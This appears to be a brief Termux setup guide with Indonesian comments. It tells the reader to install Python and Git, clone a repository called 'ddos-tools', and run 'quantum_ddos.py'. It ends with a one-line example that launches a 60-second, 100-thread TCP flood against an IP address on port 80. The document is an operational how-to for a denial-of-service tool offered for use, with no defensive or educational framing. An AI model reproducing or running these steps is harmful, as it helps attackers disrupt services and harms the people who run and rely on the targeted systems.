# 1. Update Termux
pkg update && pkg upgrade

# 2. Install Python & Git
pkg install python git -y

# 3. Clone repository
git clone https://github.com/RianModss/ddos-tools.git

# 4. Masuk ke directory
cd ddos-tools

# 5. Berikan permission
chmod +x quantum_ddos.py

# 6. Jalankan script
python quantum_ddos.py

# Atau langsung dengan satu command:
python3 quantum_ddos.py --target 192.168.1.1 --port 80 --method TCP --threads 100 --time 60
